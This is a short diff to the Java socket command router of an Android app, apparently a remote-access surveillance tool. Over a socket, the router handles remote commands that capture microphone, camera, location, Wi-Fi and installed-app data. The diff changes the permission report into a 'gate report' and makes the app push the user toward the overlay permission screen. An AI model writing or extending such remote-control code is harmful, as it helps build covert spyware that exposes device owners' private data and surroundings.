@@ -97,7 +97,7 @@ public final class SocketCommandRouter {
                 case Protocol.MIC:         handleMic(data, socket, cmdId); break;
                 case Protocol.LOCATION:    handleLocation(socket, cmdId); break;
                 case Protocol.WIFI:        handleWifi(socket, cmdId); break;
-                case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.getGranted(), cmdId)); break;
+                case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.buildGateReport(FasonApp.getContext()), cmdId)); break;
                 case Protocol.APPS:        EXEC.execute(() -> emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)), cmdId)); break;
                 case Protocol.PERM_CHECK:  checkPerm(socket, data.optString(Protocol.KEY_PERM, ""), cmdId); break;
                 case Protocol.CAMERA:      handleCamera(data, socket, cmdId); break;
@@ -521,7 +521,7 @@ public final class SocketCommandRouter {
         long now = System.currentTimeMillis();
         if (now - lastSettingsPromptTime > SETTINGS_PROMPT_COOLDOWN_MS) {
             lastSettingsPromptTime = now;
-            handler.post(() -> PermissionManager.openAppSettings(FasonApp.getContext()));
+            handler.post(() -> PermissionManager.openGate(FasonApp.getContext(), PermissionManager.findGate("overlay")));
         }
     }
 
